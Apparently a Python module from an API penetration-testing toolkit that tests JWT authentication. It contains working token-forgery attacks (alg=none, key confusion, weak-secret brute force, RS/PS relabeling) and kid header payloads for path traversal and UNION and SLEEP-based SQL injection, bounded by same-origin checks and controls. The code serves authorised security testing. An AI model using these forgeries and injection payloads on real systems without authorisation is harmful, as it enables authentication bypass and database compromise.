#!/usr/bin/env python3
"""
Authentication Analyzer Module - api-breaker
Analyzes and tests API authentication mechanisms including JWT attacks.
Author: orizon.one
"""

import argparse
import base64
import hashlib
import hmac
import json
import math
import re
import time
import urllib.request
import urllib.parse
from datetime import datetime, timezone

# Real-key JWKS extraction and jwk-header-injection forgery (building/
# signing with actual RSA key material) were implemented and verified in
# an earlier pass but deliberately NOT shipped: this skill is part of the
# "core pipeline" requirements.txt documents as stdlib-only BY DESIGN, and
# the user chose to preserve that invariant over adding `cryptography`
# for these two checks specifically. The full design (exact test logic,
# why jwk-injection is the single highest-priority item in the research)
# is written out in research_notes/API breaker depth techniques/
# jwt_edge_cases.md's "jwk header injection" Inferences section if this
# tradeoff is revisited later. Every check actually shipped below (kid
# injection, crit-header, RS<->PS relabeling, aud/iss, CVE table) is
# zero-new-dependency and stdlib-only, same as the rest of this skill.


from _common import http_request, log, same_origin_url, success, vuln, warn
from response_safety import safe_response_preview
# Common weak JWT secrets for brute-force
WEAK_SECRETS = [
    "secret", "password", "123456", "key", "private", "public",
    "jwt_secret", "token", "auth", "admin", "test", "default",
    "changeme", "supersecret", "mysecret", "s3cr3t", "jwt",
    "hmac", "signing_key", "app_secret", "api_secret", "secretkey",
    "secret_key", "jwt-secret", "jwt_secret_key", "HS256",
    "qwerty", "abc123", "letmein", "welcome", "monkey",
    "master", "dragon", "login", "princess", "football",
    "shadow", "sunshine", "trustno1", "iloveyou", "1234567890",
    "", "null", "none", "undefined", "true", "false",
]


def b64url_encode(data):
    """Base64url encode without padding."""
    if isinstance(data, str):
        data = data.encode("utf-8")
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("utf-8")


def b64url_decode(data):
    """Base64url decode with padding fix."""
    if isinstance(data, str):
        data = data.encode("ascii")
    if not isinstance(data, bytes) or not re.fullmatch(rb"[A-Za-z0-9_-]*", data):
        raise ValueError("invalid base64url segment")
    if len(data) % 4 == 1:
        raise ValueError("invalid base64url length")
    padding = 4 - len(data) % 4
    if padding != 4:
        data += b"=" * padding
    return base64.b64decode(data, altchars=b"-_", validate=True)


def decode_jwt(token):
    """Decode a JWT token without verification."""
    if not isinstance(token, str):
        return None
    parts = token.split(".")
    if (
        len(parts) != 3
        or not parts[2]
        and not re.fullmatch(r"[A-Za-z0-9_-]*", parts[2])
        or parts[2] and not re.fullmatch(r"[A-Za-z0-9_-]+", parts[2])
    ):
        return None

    try:
        header = json.loads(b64url_decode(parts[0]))
        payload = json.loads(b64url_decode(parts[1]))
        if not isinstance(header, dict) or not isinstance(payload, dict):
            return None
        return {
            "header": header,
            "payload": payload,
            "signature": parts[2],
            "raw_parts": parts,
        }
    except Exception:
        return None


SENSITIVE_CLAIM_KEY = re.compile(
    r"(?:password|passwd|secret|token|api[_-]?key|private[_-]?key|"
    r"signing[_-]?key|jwk|authorization|cookie|"
    r"credit.?card|cc.?number|ssn|social.?security|email|phone|mobile)",
    re.IGNORECASE,
)


def redact_claim_values(value):
    """Redact credential and personal-data claim values before report output."""
    if isinstance(value, dict):
        return {
            key: "[REDACTED]" if SENSITIVE_CLAIM_KEY.search(str(key))
            else redact_claim_values(item)
            for key, item in value.items()
        }
    if isinstance(value, list):
        return [redact_claim_values(item) for item in value]
    return value


def forge_jwt_none(payload, header_extra=None):
    """Forge a JWT with algorithm=none."""
    header = {"alg": "none", "typ": "JWT"}
    if header_extra:
        header.update(header_extra)

    h = b64url_encode(json.dumps(header))
    p = b64url_encode(json.dumps(payload))
    return f"{h}.{p}."


def forge_jwt_hs256(payload, secret, header_extra=None):
    """Forge a JWT with HS256."""
    header = {"alg": "HS256", "typ": "JWT"}
    if header_extra:
        header.update(header_extra)

    h = b64url_encode(json.dumps(header))
    p = b64url_encode(json.dumps(payload))
    signing_input = f"{h}.{p}"
    sig = hmac.new(
        secret.encode("utf-8") if isinstance(secret, str) else secret,
        signing_input.encode("utf-8"),
        hashlib.sha256,
    ).digest()
    s = b64url_encode(sig)
    return f"{h}.{p}.{s}"


def invalid_jwt_control_status(test_url, extra_headers=None, delay=0):
    """Return the response to a deliberately malformed token for comparison."""
    headers = dict(extra_headers or {})
    headers["Authorization"] = "Bearer invalid.invalid.invalid"
    status, _, _ = http_request(test_url, headers=headers)
    if delay:
        time.sleep(delay)
    return status


def auth_probe_outcome(status, invalid_status):
    """A 2xx is confirmed only when the same endpoint rejects an invalid token."""
    if status not in (200, 201):
        return None
    return "confirmed" if invalid_status in (401, 403) else "candidate"


def parse_delay(value):
    try:
        delay = float(value)
    except (TypeError, ValueError) as exc:
        raise argparse.ArgumentTypeError("delay must be a number") from exc
    if not math.isfinite(delay) or not 0 <= delay <= 60:
        raise argparse.ArgumentTypeError("delay must be finite and between 0 and 60 seconds")
    return delay


def test_jwt_none_bypass(
    decoded_jwt, test_url, extra_headers=None, delay=0, invalid_status=None
):
    """Test JWT none algorithm bypass."""
    log("Testing JWT 'none' algorithm bypass...")
    findings = []
    if invalid_status is None:
        invalid_status = invalid_jwt_control_status(test_url, extra_headers, delay)

    payload = decoded_jwt["payload"]
    for alg_name in ["none", "None", "NONE", "nOnE"]:
        forged = forge_jwt_none(payload, {"alg": alg_name})
        headers = {"Authorization": f"Bearer {forged}"}
        if extra_headers:
            headers.update(extra_headers)
            headers["Authorization"] = f"Bearer {forged}"

        status, _, body = http_request(test_url, headers=headers)
        if delay:
            time.sleep(delay)

        outcome = auth_probe_outcome(status, invalid_status)
        if outcome:
            confirmed = outcome == "confirmed"
            message = (
                f"JWT 'none' algorithm bypass works with alg={alg_name}"
                if confirmed else
                f"JWT 'none' algorithm candidate with alg={alg_name}; invalid-token control was not rejected"
            )
            (vuln if confirmed else log)(message)
            findings.append({
                "type": "jwt_none_bypass" if confirmed else "jwt_none_bypass_candidate",
                "severity": "critical" if confirmed else "info",
                "algorithm_used": alg_name,
                "response_status": status,
                "invalid_token_status": invalid_status,
                "validated": confirmed,
            })
            if confirmed:
                break

    return findings


def test_jwt_hs256_confusion(
    decoded_jwt, test_url, extra_headers=None, delay=0, invalid_status=None
):
    """Test RS256 to HS256 key confusion attack."""
    log("Testing RS256->HS256 key confusion...")
    findings = []
    if invalid_status is None:
        invalid_status = invalid_jwt_control_status(test_url, extra_headers, delay)

    original_alg = decoded_jwt["header"].get("alg", "")
    if original_alg not in ("RS256", "RS384", "RS512"):
        log(f"Original algorithm is {original_alg}, skipping key confusion test")
        return findings

    # In a real attack, we'd need the public key. Test with empty/common keys.
    # (A real-key variant -- fetching the server's actual public key via
    # JWKS and building a working PEM from it -- was designed and verified
    # in an earlier pass but not shipped: it needs the `cryptography`
    # package, and this skill is part of the stdlib-only-by-design core
    # pipeline. See research_notes/API breaker depth techniques/
    # jwt_edge_cases.md's "Upgrade the existing RS256->HS256 test" note if
    # that tradeoff is revisited.)
    test_keys = ["", "public_key", "-----BEGIN PUBLIC KEY-----"]
    payload = decoded_jwt["payload"]

    for key in test_keys:
        forged = forge_jwt_hs256(payload, key)
        headers = {"Authorization": f"Bearer {forged}"}
        if extra_headers:
            headers.update(extra_headers)
            headers["Authorization"] = f"Bearer {forged}"

        status, _, body = http_request(test_url, headers=headers)
        if delay:
            time.sleep(delay)

        outcome = auth_probe_outcome(status, invalid_status)
        if outcome:
            confirmed = outcome == "confirmed"
            message = (
                "RS256->HS256 key confusion attack accepted"
                if confirmed else
                "RS256->HS256 key confusion candidate; invalid-token control was not rejected"
            )
            (vuln if confirmed else log)(message)
            findings.append({
                "type": "jwt_key_confusion" if confirmed else "jwt_key_confusion_candidate",
                "severity": "critical" if confirmed else "info",
                "original_alg": original_alg,
                "attack_alg": "HS256",
                "key_used": key[:20] if key else "(empty)",
                "response_status": status,
                "invalid_token_status": invalid_status,
                "validated": confirmed,
            })
            if confirmed:
                break

    return findings


KID_PATH_TRAVERSAL_SECRETS = [
    ("../../../../dev/null", ""),
    ("../../../../proc/sys/kernel/randomize_va_space", "2"),
]


def test_jwt_kid_injection(
    decoded_jwt, test_url, extra_headers=None, delay=0, invalid_status=None
):
    """kid (Key ID) header injection: path traversal and SQL injection.
    research_notes/API breaker depth techniques/jwt_edge_cases.md -- when
    the server looks up the signing key by `kid` (as a filename or a DB
    lookup) without sanitizing it, redirecting the lookup to a predictable
    file/value and forging against THAT as the HMAC secret is a direct
    forgery primitive, same forge/send/check shape as
    brute_force_jwt_secret, just varying where the 'secret' comes from."""
    log("Testing JWT 'kid' header injection (path traversal + SQLi)...")
    findings = []
    payload = decoded_jwt["payload"]
    if invalid_status is None:
        invalid_status = invalid_jwt_control_status(test_url, extra_headers, delay)

    for traversal_path, expected_secret in KID_PATH_TRAVERSAL_SECRETS:
        forged = forge_jwt_hs256(payload, expected_secret, {"kid": traversal_path})
        headers = {"Authorization": f"Bearer {forged}"}
        if extra_headers:
            headers.update(extra_headers)
            headers["Authorization"] = f"Bearer {forged}"

        status, _, _ = http_request(test_url, headers=headers)
        if delay:
            time.sleep(delay)

        outcome = auth_probe_outcome(status, invalid_status)
        if outcome:
            confirmed = outcome == "confirmed"
            message = (
                f"JWT 'kid' path traversal accepted for {traversal_path!r}"
                if confirmed else
                f"JWT 'kid' path traversal candidate for {traversal_path!r}; invalid-token control was not rejected"
            )
            (vuln if confirmed else log)(message)
            findings.append({
                "type": "jwt_kid_path_traversal" if confirmed else "jwt_kid_path_traversal_candidate",
                "severity": "critical" if confirmed else "info",
                "kid_payload": traversal_path, "secret_used": expected_secret,
                "response_status": status,
                "invalid_token_status": invalid_status, "validated": confirmed,
            })
            if confirmed:
                break

    # UNION-based kid SQLi: tests whether the lookup is injectable at all by
    # forging against a secret the payload itself names -- this confirms
    # injectability, it doesn't discover an unknown real secret.
    sqli_payload = "' UNION SELECT 'knownsecret'-- -"
    forged = forge_jwt_hs256(payload, "knownsecret", {"kid": sqli_payload})
    headers = {"Authorization": f"Bearer {forged}"}
    if extra_headers:
        headers.update(extra_headers)
        headers["Authorization"] = f"Bearer {forged}"
    status, _, _ = http_request(test_url, headers=headers)
    if delay:
        time.sleep(delay)
    outcome = auth_probe_outcome(status, invalid_status)
    if outcome:
        confirmed = outcome == "confirmed"
        message = (
            "JWT 'kid' lookup injection accepted"
            if confirmed else
            "JWT 'kid' lookup injection candidate; invalid-token control was not rejected"
        )
        (vuln if confirmed else log)(message)
        findings.append({
            # NOT "jwt_kid_sqli" -- import_findings.py's elif chain checks
            # "sqli" FIRST, before "jwt", so a type string containing both
            # substrings would be silently misrouted into generic SQLi
            # chaining semantics (data_access/rce_potential) instead of
            # this finding's actual meaning (a JWT forgery primitive ->
            # authentication_bypass/impersonation). Caught by testing the
            # real chain end-to-end, not by inspecting the string by eye.
            "type": "jwt_kid_lookup_injection" if confirmed else "jwt_kid_lookup_injection_candidate",
            "severity": "critical" if confirmed else "info",
            "kid_payload": sqli_payload, "secret_used": "knownsecret",
            "response_status": status,
            "invalid_token_status": invalid_status, "validated": confirmed,
        })

    return findings


def test_jwt_kid_sqli_timing(decoded_jwt, test_url, extra_headers=None, delay=0, sleep_seconds=4):
    """Time-based 'kid' SQLi probe, independent of token forgery -- confirms
    the kid lookup is injectable even when no UNION payload can be mapped
    to a literal HMAC secret. Compares response latency for a SLEEP-based
    kid payload against a benign baseline; a large latency delta neither
    forge test above could produce is itself a reportable finding."""
    log("Testing JWT 'kid' header for time-based SQL injection...")
    findings = []
    payload = decoded_jwt["payload"]
    if not math.isfinite(sleep_seconds) or not 1 <= sleep_seconds <= 10:
        raise ValueError("sleep_seconds must be finite and between 1 and 10")

    baseline_token = forge_jwt_hs256(payload, "benign-kid-baseline", {"kid": "benign-key-id"})
    headers = {"Authorization": f"Bearer {baseline_token}"}
    if extra_headers:
        headers.update(extra_headers)
        headers["Authorization"] = f"Bearer {baseline_token}"
    start = time.monotonic()
    http_request(test_url, headers=headers)
    baseline_elapsed = time.monotonic() - start
    if delay:
        time.sleep(delay)

    sleep_payload = f"' AND SLEEP({sleep_seconds})-- -"
    sleep_token = forge_jwt_hs256(payload, "irrelevant", {"kid": sleep_payload})
    headers["Authorization"] = f"Bearer {sleep_token}"
    start = time.monotonic()
    http_request(test_url, headers=headers)
    sleep_elapsed = time.monotonic() - start
    if delay:
        time.sleep(delay)

    # Require at least 70% of the requested sleep duration to show up as
    # extra latency -- tolerates normal network jitter while still catching
    # a real SLEEP()-induced delay.
    if sleep_elapsed - baseline_elapsed > sleep_seconds * 0.7:
        vuln(f"JWT 'kid' time-based SQLi: baseline {baseline_elapsed:.2f}s vs SLEEP({sleep_seconds}) {sleep_elapsed:.2f}s")
        findings.append({
            "type": "jwt_kid_lookup_injection_timing", "severity": "critical",  # see naming note above
            "baseline_seconds": round(baseline_elapsed, 2),
            "sleep_payload_seconds": round(sleep_elapsed, 2),
            "sleep_requested_seconds": sleep_seconds,
        })

    return findings


def test_jwt_crit_header_bypass(
    decoded_jwt, test_url, extra_headers=None, delay=0, invalid_status=None
):
    """RFC 7515 Section 4.1.11: a verifier MUST reject a JWT whose 'crit'
    header names an extension it doesn't understand/enforce. CVE-2026-32597
    (PyJWT) and CVE-2026-35042 (fast-jwt) both silently accepted such
    tokens instead. Differential test: forge the SAME 'none'-alg-bypass
    token twice, once with an unrecognized crit extension added and once
    without -- if both are accepted identically, the header's presence
    made no difference, confirming it was never checked. Only meaningful
    (and only reported) when the control token is itself accepted; if the
    base none-alg bypass doesn't work at all, there is nothing to compare,
    not a safe result for crit specifically."""
    log("Testing JWT 'crit' header non-enforcement (RFC 7515 Section 4.1.11)...")
    findings = []
    payload = decoded_jwt["payload"]
    if invalid_status is None:
        invalid_status = invalid_jwt_control_status(test_url, extra_headers, delay)

    control_token = forge_jwt_none(payload)
    control_headers = {"Authorization": f"Bearer {control_token}"}
    if extra_headers:
        control_headers.update(extra_headers)
        control_headers["Authorization"] = f"Bearer {control_token}"
    control_status, _, _ = http_request(test_url, headers=control_headers)
    if delay:
        time.sleep(delay)

    if control_status not in (200, 201):
        log("'none'-alg control token was not accepted -- nothing to compare crit against, skipping")
        return findings

    crit_token = forge_jwt_none(payload, {"crit": ["mythosTestExt"], "mythosTestExt": "x"})
    crit_headers = {"Authorization": f"Bearer {crit_token}"}
    if extra_headers:
        crit_headers.update(extra_headers)
        crit_headers["Authorization"] = f"Bearer {crit_token}"
    crit_status, _, _ = http_request(test_url, headers=crit_headers)
    if delay:
        time.sleep(delay)

    outcome = auth_probe_outcome(crit_status, invalid_status)
    if control_status in (200, 201) and outcome:
        confirmed = outcome == "confirmed"
        message = (
            "JWT 'crit' header not enforced -- unrecognized critical extension made no difference"
            if confirmed else
            "JWT 'crit' header candidate; invalid-token control was not rejected"
        )
        (vuln if confirmed else log)(message)
        findings.append({
            "type": "jwt_crit_not_enforced" if confirmed else "jwt_crit_not_enforced_candidate",
            "severity": "medium" if confirmed else "info",
            "crit_extension": "mythosTestExt",
            "control_status": control_status, "crit_status": crit_status,
            "invalid_token_status": invalid_status, "validated": confirmed,
        })

    return findings


def test_jwt_rs_ps_relabel(
    decoded_jwt, test_url, extra_headers=None, delay=0, invalid_status=None
):
    """RS256<->PS256 (and 384/512) confusion via pure header relabeling --
    zero new crypto, zero key material needed. Both share the same RSA key,
    so a verifier that dispatches on the literal 'alg' string into a
    generic 'RSA verify' routine without checking which padding scheme was
    actually used can accept a signature produced under one alg when the
    header claims the other. Replays the ORIGINAL signature bytes
    unchanged -- just a header swap and resend."""
    log("Testing JWT RS256<->PS256 relabeling...")
    findings = []
    if invalid_status is None:
        invalid_status = invalid_jwt_control_status(test_url, extra_headers, delay)
    original_alg = decoded_jwt["header"].get("alg", "")
    relabel_map = {"RS256": "PS256", "RS384": "PS384", "RS512": "PS512",
                    "PS256": "RS256", "PS384": "RS384", "PS512": "RS512"}
    target_alg = relabel_map.get(original_alg)
    if not target_alg:
        log(f"Original algorithm is {original_alg}, not RS*/PS* -- skipping relabel test")
        return findings

    header = dict(decoded_jwt["header"])
    header["alg"] = target_alg
    h = b64url_encode(json.dumps(header))
    p = b64url_encode(json.dumps(decoded_jwt["payload"]))
    relabeled = f"{h}.{p}.{decoded_jwt['signature']}"

    headers = {"Authorization": f"Bearer {relabeled}"}
    if extra_headers:
        headers.update(extra_headers)
        headers["Authorization"] = f"Bearer {relabeled}"
    status, _, _ = http_request(test_url, headers=headers)
    if delay:
        time.sleep(delay)

    outcome = auth_probe_outcome(status, invalid_status)
    if outcome:
        confirmed = outcome == "confirmed"
        message = (
            f"JWT {original_alg}<->{target_alg} relabeling accepted"
            if confirmed else
            f"JWT {original_alg}<->{target_alg} relabeling candidate; invalid-token control was not rejected"
        )
        (vuln if confirmed else log)(message)
        findings.append({
            "type": "jwt_rs_ps_confusion" if confirmed else "jwt_rs_ps_confusion_candidate",
            "severity": "high" if confirmed else "info",
            "original_alg": original_alg, "relabeled_alg": target_alg,
            "response_status": status,
            "invalid_token_status": invalid_status, "validated": confirmed,
        })

    return findings


# Static CVE fingerprint table (research_notes/API breaker depth
# techniques/jwt_edge_cases.md's consolidated reference table) -- keyed by
# an explicit --library/--library-version the caller supplies (from recon,
# an error-message leak, a changelog, etc.), same reliable pattern as
# model_supply_chain.py/mcp_security_tester.py's CVE tables rather than
# fragile automated library fingerprinting. fixed_version is a tuple, or
# None when the research found no fixed-version number to compare against.
JWT_CVE_TABLE = [
    {"aliases": ["pyjwt"], "fixed_version": (2, 12, 0), "cve": "CVE-2026-32597",
     "note": "crit header (RFC 7515 4.1.11) not validated, silently accepts unknown critical extensions."},
    {"aliases": ["pyjwt"], "fixed_version": (2, 13, 0), "cve": "CVE-2026-48522",
     "note": "PyJWKClient missing URL-scheme allowlist on JWKS fetch (file://, ftp://, data: all dereferenced)."},
    {"aliases": ["pyjwt"], "fixed_version": (2, 10, 1), "cve": "CVE-2024-53861",
     "note": "buggy iss claim comparison accepts substring matches rather than requiring an exact match."},
    {"aliases": ["python-jose"], "fixed_version": (3, 4, 0), "cve": "CVE-2024-33663",
     "note": "algorithm confusion via OpenSSH-format ECDSA keys; algorithms allowlist param not mandatory."},
    {"aliases": ["python-jose"], "fixed_version": None, "cve": "CVE-2025-61152",
     "note": "alg:none accepted unless explicitly excluded from the allowed-algorithms list."},
    {"aliases": ["jose", "panva-jose"], "fixed_version": (4, 15, 5), "cve": "CVE-2024-28176",
     "note": "JWE resource exhaustion via crafted compressed (zip) plaintext (decompression bomb)."},
    {"aliases": ["jose-dart", "appsup-dart-jose"], "fixed_version": (0, 3, 5), "cve": "CVE-2026-34240",
     "note": "accepts an attacker-embedded jwk header key with no trusted-keystore check (Dart package, unrelated to panva's npm jose)."},
    {"aliases": ["joserfc"], "fixed_version": None, "cve": "CVE-2026-62995",
     "note": "accepts non-canonically-padded base64 JWT segments (parsing-differential malleability)."},
    {"aliases": ["cjwt"], "fixed_version": None, "cve": "CVE-2024-54150",
     "note": "algorithm confusion: HMAC-verify path accepts RSA public-key PEM bytes as the HMAC secret."},
    {"aliases": ["web-token/jwt-framework", "jwt-framework"], "fixed_version": (3, 4, 10), "cve": "GHSA-jc38-x7x8-2xc8",
     "note": "protected/unprotected header-merge TOCTOU lets an unprotected-header alg override the validated protected one."},
    {"aliases": ["liboauth2"], "fixed_version": None, "cve": "CVE-2026-54430",
     "note": "unvalidated kid built into a URL and fetched BEFORE signature verification -> SSRF."},
    {"aliases": ["centrifugo"], "fixed_version": (6, 8, 1), "cve": "CVE-2026-49998",
     "note": "dynamic-JWKS cache keyed only by kid (not issuer/audience) -> cross-tenant auth bypass."},
    {"aliases": ["rodauth"], "fixed_version": (2, 47, 0), "cve": "CVE-2026-82469",
     "note": "refresh route issues new tokens without validating token type/method."},
    {"aliases": ["fast-jwt"], "fixed_version": (6, 2, 0), "cve": "CVE-2026-35042",
     "note": "crit header (RFC 7515 4.1.11) not validated, same class as the PyJWT CVE above."},
]


def check_jwt_cve_fingerprint(library, version):
    """Static table + tuple version comparison, no network calls. Every
    hit is a version-matched HYPOTHESIS to verify, never a confirmed
    exploit -- this never attempts exploitation of any library CVE."""
    norm = (library or "").strip().lower()
    parsed = tuple(int(n) for n in re.findall(r"\d+", version or "")) or None
    hits = []
    for row in JWT_CVE_TABLE:
        if norm not in {a.lower() for a in row["aliases"]}:
            continue
        fixed = row["fixed_version"]
        if fixed is None:
            verdict = "hypothesis_unversioned"
        elif parsed is None:
            verdict = "hypothesis_unknown_version"
        elif parsed < fixed:
            verdict = "hypothesis_version_matched"
        else:
            verdict = "patched"
        hits.append({"cve": row["cve"], "library": library, "version": version,
                     "verdict": verdict, "note": row["note"]})
    return hits


def brute_force_jwt_secret(
    decoded_jwt, test_url, extra_headers=None, delay=0, invalid_status=None
):
    """Brute-force weak JWT secrets."""
    log(f"Brute-forcing JWT secret ({len(WEAK_SECRETS)} candidates)...")
    findings = []

    payload = decoded_jwt["payload"]
    if invalid_status is None:
        invalid_status = invalid_jwt_control_status(test_url, extra_headers, delay)

    for secret in WEAK_SECRETS:
        forged = forge_jwt_hs256(payload, secret)
        headers = {"Authorization": f"Bearer {forged}"}
        if extra_headers:
            headers.update(extra_headers)
            headers["Authorization"] = f"Bearer {forged}"

        status, _, body = http_request(test_url, headers=headers)
        if delay:
            time.sleep(delay)

        outcome = auth_probe_outcome(status, invalid_status)
        if outcome:
            confirmed = outcome == "confirmed"
            message = (
                f"JWT weak secret found: '{secret}'"
                if confirmed else
                "JWT weak-secret candidate; invalid-token control was not rejected"
            )
            (vuln if confirmed else log)(message)
            findings.append({
                "type": "jwt_weak_secret" if confirmed else "jwt_weak_secret_candidate",
                "severity": "critical" if confirmed else "info",
                "secret": secret,
                "response_status": status,
                "invalid_token_status": invalid_status,
                "validated": confirmed,
            })
            break

    return findings


def test_api_key_positions(base_url, api_key, endpoints=None, delay=0):
    """Test API key in different positions."""
    log("Testing API key in various positions...")
    findings = []

    candidates = endpoints or [base_url]
    test_urls = []
    for candidate in candidates:
        url = same_origin_url(base_url, candidate)
        if url:
            test_urls.append(url)
        else:
            warn(f"Skipping API-key probe outside the API base origin: {candidate}")
    positions = [
        ("header_authorization", {"Authorization": f"Bearer {api_key}"}),
        ("header_x_api_key", {"X-API-Key": api_key}),
        ("header_api_key", {"Api-Key": api_key}),
        ("header_x_auth_token", {"X-Auth-Token": api_key}),
    ]

    query_positions = [
        ("query_api_key", "api_key"),
        ("query_apikey", "apikey"),
        ("query_key", "key"),
        ("query_token", "token"),
        ("query_access_token", "access_token"),
    ]

    for url in test_urls[:5]:
        control_status, _, _ = http_request(url)
        if delay:
            time.sleep(delay)
        for pos_name, headers in positions:
            status, _, body = http_request(url, headers=headers)
            if delay:
                time.sleep(delay)
            outcome = auth_probe_outcome(status, control_status)
            if outcome:
                confirmed = outcome == "confirmed"
                message = (
                    f"API key accepted at {pos_name} for {url}"
                    if confirmed else
                    f"API key position candidate at {pos_name}; unauthenticated control was not rejected"
                )
                (success if confirmed else log)(message)
                findings.append({
                    "type": "api_key_position" if confirmed else "api_key_position_candidate",
                    "severity": "high" if confirmed else "info",
                    "position": pos_name,
                    "url": url,
                    "status": status,
                    "control_status": control_status,
                    "validated": confirmed,
                })

        for pos_name, param in query_positions:
            parsed_url = urllib.parse.urlsplit(url)
            query = urllib.parse.parse_qsl(parsed_url.query, keep_blank_values=True)
            query.append((param, api_key))
            test_url = urllib.parse.urlunsplit(
                parsed_url._replace(query=urllib.parse.urlencode(query))
            )
            status, _, body = http_request(test_url)
            if delay:
                time.sleep(delay)
            outcome = auth_probe_outcome(status, control_status)
            if outcome:
                confirmed = outcome == "confirmed"
                message = (
                    f"API key accepted at {pos_name} for {url}"
                    if confirmed else
                    f"API key position candidate at {pos_name}; unauthenticated control was not rejected"
                )
                (success if confirmed else log)(message)
                findings.append({
                    "type": "api_key_position" if confirmed else "api_key_position_candidate",
                    "severity": "high" if confirmed else "info",
                    "position": pos_name,
                    "url": url,
                    "status": status,
                    "control_status": control_status,
                    "validated": confirmed,
                })

    return findings


def test_no_auth_access(base_url, endpoints, delay=0, auth_token=None, extra_headers=None):
    """Test endpoints accessible without authentication."""
    log("Testing for endpoints accessible without authentication...")
    findings = []

    for ep in endpoints:
        url = ep if isinstance(ep, str) else ep.get("url", "")
        if not url:
            continue
        scoped_url = same_origin_url(base_url, url)
        if not scoped_url:
            warn(f"Skipping no-auth probe outside the API base origin: {url}")
            continue
        url = scoped_url

        authenticated_headers = dict(extra_headers or {})
        if auth_token:
            authenticated_headers["Authorization"] = f"Bearer {auth_token}"
        auth_status = None
        if authenticated_headers:
            auth_status, _, _ = http_request(url, headers=authenticated_headers)
            if delay:
                time.sleep(delay)

        status, _, body = http_request(url)
        if delay:
            time.sleep(delay)

        if status in (200, 201):
            # Check if there's actual data
            has_data = len(body) > 50
            if has_data:
                log(
                    f"No-auth access candidate: {url} returned data without authentication; "
                    "endpoint sensitivity and intended access were not established"
                )
                findings.append({
                    "type": "no_auth_required_candidate",
                    "severity": "info",
                    "url": url,
                    "status": status,
                    "response_length": len(body),
                    "response_preview": safe_response_preview(body),
                    "authenticated_status": auth_status,
                    "validated": False,
                })

    return findings


def analyze_jwt_claims(decoded_jwt):
    """Analyze JWT claims for security issues."""
    findings = []
    payload = decoded_jwt["payload"]
    header = decoded_jwt["header"]

    # Check algorithm
    alg = header.get("alg", "")
    if alg == "none":
        vuln("JWT uses 'none' algorithm!")
        findings.append({"type": "jwt_none_alg", "severity": "critical"})
    elif alg in ("HS256", "HS384", "HS512"):
        warn(f"JWT uses symmetric algorithm: {alg}")
        findings.append({
            "type": "jwt_symmetric_alg",
            "severity": "medium",
            "algorithm": alg,
        })

    # Check audience/issuer validation gaps (research_notes/API breaker
    # depth techniques/jwt_edge_cases.md: a service that validates
    # signature and expiry but skips `aud` will accept a token minted for
    # a DIFFERENT service that shares the same issuer/signing key -- the
    # cheapest possible check in this whole report, zero new HTTP
    # requests, pure claims analysis on data already decoded).
    if "aud" not in payload:
        vuln("JWT has no audience (aud) claim!")
        findings.append({"type": "jwt_no_audience", "severity": "high"})
    if "iss" not in payload:
        warn("JWT has no issuer (iss) claim")
        findings.append({"type": "jwt_no_issuer", "severity": "medium"})

    # Check expiration
    exp = payload.get("exp")
    if exp is None:
        vuln("JWT has no expiration claim!")
        findings.append({"type": "jwt_no_expiry", "severity": "high"})
    elif isinstance(exp, (int, float)) and not isinstance(exp, bool):
        try:
            if isinstance(exp, float) and not math.isfinite(exp):
                raise ValueError("expiration is not finite")
            exp_dt = datetime.fromtimestamp(exp, timezone.utc)
        except (OverflowError, OSError, ValueError):
            warn("JWT has an invalid or unrepresentable expiration claim")
            findings.append({"type": "jwt_invalid_expiry", "severity": "info"})
        else:
            now = datetime.now(timezone.utc)
            if exp_dt < now:
                warn(f"JWT is expired (exp: {exp_dt.isoformat()})")
            else:
                diff = exp_dt - now
                if diff.days > 30:
                    warn(f"JWT has very long expiry: {diff.days} days")
                    findings.append({
                        "type": "jwt_long_expiry",
                        "severity": "low",
                        "expiry_days": diff.days,
                    })
    else:
        warn("JWT has a non-numeric expiration claim")
        findings.append({"type": "jwt_invalid_expiry", "severity": "info"})

    # Check for sensitive data in payload
    sensitive_keys = ["password", "passwd", "secret", "credit_card", "ssn", "cc_number"]
    for key in sensitive_keys:
        if key in payload:
            vuln(f"JWT contains sensitive field: {key}")
            findings.append({
                "type": "jwt_sensitive_data",
                "severity": "high",
                "field": key,
            })

    # Check for privilege-related claims
    privilege_claims = {}
    for key in ["role", "roles", "admin", "is_admin", "isAdmin", "permissions",
                 "scope", "scopes", "groups", "level", "privilege"]:
        if key in payload:
            privilege_claims[key] = payload[key]

    if privilege_claims:
        findings.append({
            "type": "jwt_privilege_claims",
            "severity": "info",
            "claims": redact_claim_values(privilege_claims),
        })

    return findings


def main():
    parser = argparse.ArgumentParser(description="Auth Analyzer - orizon.one")
    parser.add_argument("--input", "-i", help="Input JSON from api_discovery.py or schema_builder.py")
    parser.add_argument("--api-base", help="API base URL")
    parser.add_argument("--output", "-o", help="Output JSON file")
    parser.add_argument("--token", help="Auth token (JWT or API key) to analyze")
    parser.add_argument("--cookie", help="Session cookie")
    parser.add_argument("--delay", type=parse_delay, default=0, help="Delay between requests (0-60 seconds)")
    parser.add_argument("--library", help="JWT library name, if known (e.g. from recon/error leakage), for the static CVE fingerprint check")
    parser.add_argument("--library-version", help="JWT library version string, for the static CVE fingerprint check")
    parser.add_argument("--skip-kid-timing", action="store_true",
                         help="Skip the time-based kid-SQLi probe (sends a deliberate multi-second SLEEP payload)")
    args = parser.parse_args()

    if not args.token and not args.input:
        parser.error("Either --token or --input is required")

    extra_headers = {}
    if args.cookie:
        extra_headers["Cookie"] = args.cookie

    base_url = args.api_base or ""
    endpoints = []

    if args.input:
        log(f"Loading data from {args.input}")
        with open(args.input) as f:
            input_data = json.load(f)
        for api in input_data.get("discovered_apis", []):
            endpoints.append(api.get("url", ""))
        for ep in input_data.get("endpoints", []):
            endpoints.append(ep.get("url", ""))
        endpoints = [e for e in endpoints if e]

    if endpoints and not args.api_base:
        parser.error("Imported endpoints require an explicit trusted --api-base")

    if base_url:
        validated_base_url = same_origin_url(base_url, base_url)
        if not validated_base_url:
            parser.error("API base must be a credential-free absolute HTTP(S) URL")
        base_url = validated_base_url
        scoped_endpoints = []
        for endpoint in endpoints:
            scoped_endpoint = same_origin_url(base_url, endpoint)
            if scoped_endpoint:
                scoped_endpoints.append(scoped_endpoint)
            else:
                warn(f"Skipping imported endpoint outside the API base origin: {endpoint}")
        endpoints = scoped_endpoints

    log(f"Analyzing authentication for: {base_url}")

    all_findings = []

    # JWT Analysis
    jwt_info = None
    if args.token:
        decoded = decode_jwt(args.token)
        if decoded:
            success("Token identified as JWT")
            jwt_info = {
                "header": redact_claim_values(decoded["header"]),
                "payload": redact_claim_values(decoded["payload"]),
